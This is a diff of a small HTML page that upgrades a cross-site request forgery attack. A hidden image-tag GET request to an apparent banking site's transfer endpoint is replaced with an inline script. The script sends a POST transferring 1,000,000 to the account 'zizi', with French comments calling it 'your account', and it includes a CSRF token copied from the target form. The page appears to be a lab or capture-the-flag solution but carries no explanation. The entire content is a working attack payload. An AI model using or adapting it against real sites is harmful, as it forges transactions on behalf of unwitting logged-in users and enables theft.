@@ -1,5 +1,19 @@
+<!DOCTYPE html>
 <html>
   <body>
-    <img src="https://bankme-v4.com/transfer?to=zizi&amount=1000000" style="display:none;">
+    <script>
+      // Créer une requête POST vers l'endpoint /transfer/
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://bankme-v4.com/transfer/", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+      // Définir les paramètres du transfert
+      var recipient = "zizi"; // Votre compte
+      var amount = 1000000; // Le montant maximum
+      var token = "6757059b4f9a22da000000"; // Le token CSRF visible dans le formulaire
+
+      // Envoyer la requête
+      xhr.send(`recipient=${recipient}&amount=${amount}&token=${token}`);
+    </script>
   </body>
 </html>
